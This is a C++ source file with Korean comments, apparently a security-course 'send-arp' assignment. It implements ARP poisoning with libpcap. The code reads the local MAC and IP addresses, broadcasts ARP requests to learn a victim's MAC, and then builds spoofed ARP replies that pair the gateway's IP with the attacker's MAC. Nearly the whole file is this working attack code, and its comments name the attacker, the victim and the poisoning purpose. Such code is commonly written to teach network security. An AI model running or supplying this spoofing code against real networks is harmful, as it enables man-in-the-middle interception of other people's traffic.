#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <pcap.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "send-arp.h"

// 인터페이스의 MAC 주소를 조회
s_MacAddress getMacAddress(char *interfaceName)
{
    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFD < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    struct ifreq ifRequest;
    memset(&ifRequest, 0, sizeof(ifRequest));
    strncpy(ifRequest.ifr_name, interfaceName, IFNAMSIZ - 1);
    if (ioctl(sockFD, SIOCGIFHWADDR, &ifRequest) < 0)
    {
        perror("ioctl (get MAC address)");
        close(sockFD);
        exit(EXIT_FAILURE);
    }
    close(sockFD);
    s_MacAddress macAddr;
    memcpy(macAddr.address, ifRequest.ifr_hwaddr.sa_data, MAC_SIZE);
    return macAddr;
}

// 인터페이스의 IP 주소를 조회 (네트워크 바이트 순서로 반환)
uint32_t getIpAddress(char *interfaceName)
{
    int sockFD = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockFD < 0)
    {
        perror("socket");
        exit(EXIT_FAILURE);
    }
    struct ifreq ifRequest;
    memset(&ifRequest, 0, sizeof(ifRequest));
    strncpy(ifRequest.ifr_name, interfaceName, IFNAMSIZ - 1);
    if (ioctl(sockFD, SIOCGIFADDR, &ifRequest) < 0)
    {
        perror("ioctl (get IP address)");
        close(sockFD);
        exit(EXIT_FAILURE);
    }
    close(sockFD);
    return ((struct sockaddr_in *)&ifRequest.ifr_addr)->sin_addr.s_addr;
}

// s_MacAddress를 문자열로 변환하여 buf에 저장
void macToStrC(const s_MacAddress *mac, char *buf, size_t bufSize)
{
    snprintf(buf, bufSize, "%02x:%02x:%02x:%02x:%02x:%02x",
             mac->address[0], mac->address[1], mac->address[2],
             mac->address[3], mac->address[4], mac->address[5]);
}

// pcap 핸들을 열어 지정된 디바이스(dev)를 반환 (오류 발생 시 NULL)
pcap_t *openPcapHandle(const char *dev)
{
    char errBuffer[PCAP_ERRBUF_SIZE] = "";
    pcap_t *handle = pcap_open_live(dev, BUFSIZE, 1, 1, errBuffer);
    if (handle == NULL)
        fprintf(stderr, "Error: Cannot open device %s: %s\n", dev, errBuffer);
    return handle;
}

// ARP 요청 패킷을 구성
EthArpPacket createArpRequest(const char *attackerMacStr, uint32_t attackerIp, const char *senderIp)
{
    EthArpPacket packet;
    memset(&packet, 0, sizeof(packet));
    // Ethernet 헤더
    packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet.eth_.smac_ = Mac(attackerMacStr);
    packet.eth_.type_ = htons(EthHdr::Arp);
    // ARP 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = MAC_SIZE;
    packet.arp_.pln_ = IP_SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(attackerMacStr);
    // 공격자 IP는 getIpAddress에서 네트워크 바이트 순서로 받아옴
    packet.arp_.sip_ = attackerIp;
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = inet_addr(senderIp);
    return packet;
}

// ARP 응답을 대기하여 유효한 응답을 반환 (유효한 ARP reply를 받으면 reply에 복사하고 true 반환)
bool waitForArpReply(pcap_t *handle, const EthArpPacket &request, EthArpPacket &reply)
{
    struct pcap_pkthdr *header = NULL;
    const u_char *packetData = NULL;
    while (1)
    {
        int res = pcap_next_ex(handle, &header, &packetData);
        if (res == 0)
            continue; // 타임아웃이면 재시도
        if (res == -1 || res == -2)
        {
            fprintf(stderr, "Error: pcap_next_ex returned %d\n", res);
            return false;
        }
        memcpy(&reply, packetData, sizeof(EthArpPacket));
        if (reply.arp_.sip_ == request.arp_.tip_ &&
            reply.eth_.type_ == htons(EthHdr::Arp) &&
            reply.arp_.op_ == htons(ArpHdr::Reply))
            return true;
    }
    return false;
}

// Spoofed ARP reply 패킷을 구성 (ARP poisoning용)
// senderIp: 피해자 IP (문자열), targetIp: 타겟(게이트웨이) IP (문자열)
EthArpPacket createSpoofedReply(const char *attackerMacStr,
                                const char *senderIp,
                                const char *targetIp,
                                const Mac &victimMac)
{
    EthArpPacket packet;
    memset(&packet, 0, sizeof(packet));
    // Ethernet 헤더
    packet.eth_.dmac_ = Mac(victimMac);
    packet.eth_.smac_ = Mac(attackerMacStr);
    packet.eth_.type_ = htons(EthHdr::Arp);
    // ARP 헤더
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = MAC_SIZE;
    packet.arp_.pln_ = IP_SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(attackerMacStr);
    // spoofed reply: target IP를 공격자(게이트웨이로 위장) IP로, senderIp(피해자)에게 전달
    packet.arp_.sip_ = inet_addr(targetIp);
    packet.arp_.tmac_ = Mac(victimMac);
    packet.arp_.tip_ = inet_addr(senderIp);
    return packet;
}
